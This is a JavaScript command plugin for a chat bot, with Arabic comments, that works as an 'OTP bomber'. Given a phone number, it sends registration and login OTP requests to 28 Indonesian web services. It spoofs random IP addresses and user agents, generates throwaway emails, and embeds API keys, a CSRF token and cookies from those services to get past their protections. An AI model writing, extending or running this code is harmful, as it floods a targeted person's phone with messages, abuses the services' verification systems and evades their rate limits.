import axios from 'axios';
import crypto from 'crypto';
import config from '../../config.js';

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

function rIP() { return `${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}`; }
function rUA() { return USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)]; }
function rEmail() { return `${Array.from({length:10},()=>'abcdefghijklmnopqrstuvwxyz0123456789'[crypto.randomInt(0,36)]).join('')}@bwmyga.com`; }

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "");
  if (p.startsWith("0")) p = "62" + p.slice(1);
  if (!p.startsWith("62")) p = "62" + p;
  return p;
}

async function sendOTP(phone) {
  const p = normalizePhone(phone);
  const p08 = "0" + p.slice(2);
  const pNo = p.replace("62", "");
  const ip = rIP();
  const did = crypto.randomUUID();
  const vid = crypto.randomUUID();
  const sid = crypto.randomUUID();
  const rid = crypto.randomUUID();
  const email = rEmail();
  const results = [];

  const endpoints = [
    // 1-19: المجموعة الأولى
    { name: 'internetrakyat', url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
    { name: 'bonusbelanja', url: 'https://www.bonusbelanja.com/api/auth/registration/app', data: { phone: p, name: "user", agreeTnc: true, agreeContact: false } },
    { name: 'alodokter', url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: crypto.randomUUID() }, request_via: "whatsapp" } },
    { name: 'dokterin', url: 'https://api.dokterin.id/user/v1/users/login', data: { phone: p, tnc_accept: true } },
    { name: 'bunda', url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', data: { phone_number: pNo, country_code: "62", type: "auth" }, headers: { "Origin": "https://cms.bunda.co.id", "Referer": "https://cms.bunda.co.id/", "X-Requested-With": "XMLHttpRequest" } },
    { name: 'fastwork', url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode', data: { phone_number: p08 } },
    { name: 'paper', url: 'https://register.paper.id/api/v1/auth/register/send-otp', data: { phone: p, method: "whatsapp", registered_by: "web" } },
    { name: 'beautyhaul', url: 'https://www.beautyhaul.com/ajax/account/send_otp', data: { method: "WhatsApp", phone: p } },
    { name: 'rumah123', url: 'https://www.rumah123.com/api/otp/request-otp', data: { ipAddress: ip, phoneNumber: p, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
    { name: 'saturdays', url: 'https://beta.api.saturdays.com/api/v1/user/otp/send', data: { number: pNo, country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID", "visitor-id": vid, "session-id": sid } },
    { name: 'gritero', url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', data: { nama_lengkap: "User", telepon: p08, email: rEmail() }, headers: { "Xid": String(crypto.randomInt(1000000, 9999999)), "source": "ocistok" } },
    { name: 'duniagames', url: 'https://api.duniagames.co.id/api/other/api/v1/content/', method: "GET", headers: { "Accept-Language": "id", "x-device": did, "Ciam-Type": "FR" } },
    { name: 'bunda2', url: 'https://bunda.co.id/api/v1/auth/send-otp', data: { phone_number: pNo, country_code: "62", type: "auth" }, headers: { "Origin": "https://bunda.co.id", "Referer": "https://bunda.co.id/", "X-Requested-With": "XMLHttpRequest" } },
    { name: 'pinhome', url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: pNo }, headers: { "x-csrf-token": "v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8", "Cookie": "_X7kCsrf=v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8" } },
    { name: 'blibli', url: 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate', data: { action: "REGISTER_OTP", channel: "WHATS_APP", recipient: p, recaptchaToken: "" } },
    { name: 'adiraku', url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: pNo, type: "prospect-create", channel: "whatsapp" } },
    { name: 'matahari', url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { name: 'sicepat', url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p}?sms=false`, method: "GET", headers: { "x-recaptcha": "acf49209:033951e692315ba" } },
    { name: 'maulagi', url: 'https://api.maulagi.id/api/v2/auth/check', data: { credentials: p08 }, headers: { "X-ML-KEY": "D09ACCPN9" } },

    // 20-28: المجموعة الثانية
    { name: 'maulagi2', url: 'https://api.maulagi.id/api/v2/auth/check', data: { credentials: p }, headers: { "X-ML-KEY": "B10JLPEP10" } },
    { name: 'matahari2', url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', data: { mobileCountryCode: "", mobileNumber: p08, activationCode: "" } },
    { name: 'paper2', url: 'https://api.paper.id/api/v1/auth/login', data: { method: "whatsapp", phone: p08 }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": rid } },
    { name: 'indodax', url: 'https://api.indodax.com/api/v1/otp/send', data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } },
    { name: 'saturdays2', url: 'https://saturdays.com/api/v1/auth/otp', data: { phone: p, type: "register" } },
    { name: 'saturdays3', url: 'https://api.saturdays.com/v2/user/otp/request', data: { phoneNumber: p, channel: "whatsapp" } },
    { name: 'dokterin2', url: 'https://api.dokterin.id/user/v1/users/login', data: { phone: p, tnc_accept: true, device_id: crypto.randomUUID() }, headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" } },
    { name: 'internetrakyat2', url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" } },
    { name: 'bunda3', url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', data: { phone_number: p, type: "auth" }, headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" } },
  ];

  for (const ep of endpoints) {
    if (ep.skip) { results.push({ name: ep.name, status: '⏭️' }); continue; }
    try {
      const res = await axios({
        method: ep.method || 'POST',
        url: ep.url,
        data: ep.data || undefined,
        headers: { "Content-Type": "application/json", "User-Agent": rUA(), "X-Forwarded-For": rIP(), "Accept": "application/json", ...(ep.headers || {}) },
        timeout: 10000
      });
      results.push({ name: ep.name, status: `✅ ${res.status}` });
    } catch (e) {
      results.push({ name: ep.name, status: `❌ ${e.response?.status || e.code}` });
    }
  }

  return results;
}

const pluginConfig = {
  name: 'otp',
  alias: [],
  category: 'owner',
  description: 'إرسال OTP من 28 خدمة',
  usage: '.otp <رقم>',
  example: '.otp 628xxx',
  isOwner: true, isPremium: false, isGroup: false, isPrivate: true,
  cooldown: 60, energi: 10, isEnabled: true
};

async function handler(m, { sock }) {
  const phone = m.args.join('')?.replace(/\D/g, '').trim();

  if (!phone || phone.length < 10) {
    return m.reply(`📱 *OTP*\n\n📌 مثال: \`${m.prefix}otp 628xxx\``);
  }

  m.react('📤');
  const results = await sendOTP(phone);

  let text = `📱 *نتائج OTP*\n📞 ${phone}\n\n`;
  for (const r of results) {
    text += `${r.status} ${r.name}\n`;
  }

  const success = results.filter(r => r.status.startsWith('✅')).length;
  text += `\n📊 ${success}/${results.length} ناجح`;

  await m.reply(text);
  m.react('✅');
}

export { pluginConfig as config, handler };